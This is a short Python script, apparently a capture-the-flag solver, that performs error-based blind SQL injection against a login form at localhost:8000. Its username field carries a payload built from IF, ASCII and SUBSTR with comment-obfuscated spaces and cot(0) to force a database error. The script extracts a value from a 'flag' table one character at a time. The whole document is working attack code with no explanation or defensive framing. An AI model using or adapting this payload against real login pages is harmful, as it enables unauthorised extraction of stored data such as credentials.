#!/usr/bin/env python3
import requests

headers = {
    "Content-type": "application/x-www-form-urlencoded"
}
url = "http://localhost:8000/login"
flag = ""
done = 0
for i in range(1,64):
    if done:
        break
    print("[*] Round: " + str(i))
    for j in range(32, 127):
        done = 0
        data = {
        "username": "'|IF(ASCII(SUBSTR((SELECT/**/flag/**/from/**/flag),{pos},1))={cand},cot(0),1)#".format(pos=i, cand=j),
        "password": "1"
        }
        # print(data["username"])
        r = requests.post(url,headers=headers,data=data)
        if "db error" in r.text:
            flag = flag + chr(j)
            print("[*] \033[92m" + flag + "\033[0m")
            break
        done = 1
print("[*] Done.")
